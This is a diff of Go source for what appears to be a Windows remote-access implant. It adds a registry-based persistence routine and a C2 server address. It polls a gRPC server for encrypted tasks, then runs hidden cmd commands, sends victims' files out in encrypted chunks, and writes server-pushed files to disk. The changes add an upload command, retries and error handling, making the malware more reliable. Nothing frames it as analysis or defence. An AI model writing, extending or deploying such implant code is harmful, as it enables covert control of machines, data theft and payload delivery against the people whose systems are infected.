@@ -14,20 +14,28 @@ import (
 
 	"github.com/google/uuid"
 	"golang.org/x/sys/windows/registry"
+	"golang.org/x/text/encoding/charmap"
+	"golang.org/x/text/transform"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"google.golang.org/protobuf/proto"
 )
 
-const (
-	C2         = "192.168.1.182:50051"
-	CHUNK_SIZE = 512 * 1024
-)
+const CHUNK_SIZE = 512 * 1024
 
 var (
+	C2         string
 	ClientId   = uuid.New().String()
 	SessionKey []byte
 )
+
+func cp866ToUTF8(b []byte) string {
+	result, _, err := transform.Bytes(charmap.CodePage866.NewDecoder(), b)
+	if err != nil {
+		return string(b)
+	}
+	return string(result)
+}
 
 func ensurePersistence() {
 	exe, err := os.Executable()
@@ -59,12 +67,13 @@ func runClient() {
 		envelope, err := client.GetTask(cntx, &pb.PollRequest{ClientId: ClientId})
 		cancel()
 		if err != nil {
-			return
+			time.Sleep(2 * time.Second)
+			continue
 		}
 		if len(envelope.EncryptedData) > 0 {
 			processTask(client, envelope)
 		}
-		time.Sleep(1 * time.Second)
+		time.Sleep(time.Second)
 	}
 }
 
@@ -90,7 +99,9 @@ func processTask(client pb.ClientServiceClient, env *pb.TaskEnvelope) {
 		return
 	}
 	var task pb.Task
-	proto.Unmarshal(data, &task)
+	if err := proto.Unmarshal(data, &task); err != nil {
+		return
+	}
 	stream, err := client.SendResult(context.Background())
 	if err != nil {
 		return
@@ -99,15 +110,53 @@ func processTask(client pb.ClientServiceClient, env *pb.TaskEnvelope) {
 	case "cmd":
 		cmd := exec.Command("cmd", "/C", task.Command)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		out, _ := cmd.CombinedOutput()
-		sendResult(stream, task.TaskId, task.Command, string(out), "")
+		out, err := cmd.CombinedOutput()
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		sendResult(stream, task.TaskId, task.Command, cp866ToUTF8(out), errStr)
 	case "download":
 		sendFile(stream, task.TaskId, task.Command, task.FilePath)
+	case "upload":
+		receiveFile(stream, &task)
 	}
 	stream.CloseAndRecv()
 }
 
+func receiveFile(stream pb.ClientService_SendResultClient, task *pb.Task) {
+	if len(task.FileData) == 0 {
+		sendResult(stream, task.TaskId, task.Command, "", "no file data")
+	}
+	savePath := task.FilePath
+	if savePath == "" {
+		savePath = task.FileName
+	}
+	if savePath == "" {
+		sendResult(stream, task.TaskId, task.Command, "", "no target path")
+		return
+	}
+	if err := os.WriteFile(savePath, task.FileData, 0644); err != nil {
+		sendResult(stream, task.TaskId, task.Command, "", err.Error())
+		return
+	}
+	sendResult(stream, task.TaskId, task.Command, "file saved: "+savePath, "")
+}
+
 func sendFile(stream pb.ClientService_SendResultClient, taskId, command, path string) {
+	info, err := os.Stat(path)
+	if err != nil {
+		if os.IsNotExist(err) {
+			sendResult(stream, taskId, command, "", "not found: "+path)
+		} else {
+			sendResult(stream, taskId, command, "", err.Error())
+		}
+		return
+	}
+	if info.IsDir() {
+		sendResult(stream, taskId, command, "", path+" is a dir")
+		return
+	}
 	f, err := os.Open(path)
 	if err != nil {
 		sendResult(stream, taskId, command, "", err.Error())
@@ -123,37 +172,32 @@ func sendFile(stream pb.ClientService_SendResultClient, taskId, command, path st
 			sendResult(stream, taskId, command, "", err.Error())
 			return
 		}
-
 		isLast = (err == io.EOF || n == 0)
-
-		if n == 0 && isLast {
-			res := &pb.TaskResult{
-				TaskId:    taskId,
-				Command:   command,
-				FileName:  path,
-				FileChunk: []byte{},
-				IsLast:    true,
-			}
-			data, _ := proto.Marshal(res)
-			enc, initV, _ := crypto.Encrypt(data, SessionKey)
-			stream.Send(&pb.ResultEnvelope{
-				ClientId: ClientId, EncryptedData: enc, InitV: initV,
-			})
-			break
+		chunk := buf[:n]
+		if n == 0 {
+			chunk = []byte{}
 		}
-
 		res := &pb.TaskResult{
 			TaskId:    taskId,
 			Command:   command,
 			FileName:  path,
-			FileChunk: buf[:n],
+			FileChunk: chunk,
 			IsLast:    isLast,
 		}
-		data, _ := proto.Marshal(res)
-		enc, initV, _ := crypto.Encrypt(data, SessionKey)
+		data, err := proto.Marshal(res)
+		if err != nil {
+			return
+		}
+		enc, initV, err := crypto.Encrypt(data, SessionKey)
+		if err != nil {
+			return
+		}
 		stream.Send(&pb.ResultEnvelope{
 			ClientId: ClientId, EncryptedData: enc, InitV: initV,
 		})
+		if isLast {
+			break
+		}
 	}
 }
 
@@ -164,8 +208,14 @@ func sendResult(stream pb.ClientService_SendResultClient, taskId, command, out, 
 		Output:  out,
 		Error:   errStr,
 	}
-	data, _ := proto.Marshal(res)
-	enc, initV, _ := crypto.Encrypt(data, SessionKey)
+	data, err := proto.Marshal(res)
+	if err != nil {
+		return
+	}
+	enc, initV, err := crypto.Encrypt(data, SessionKey)
+	if err != nil {
+		return
+	}
 	stream.Send(&pb.ResultEnvelope{
 		ClientId: ClientId, EncryptedData: enc, InitV: initV,
 	})
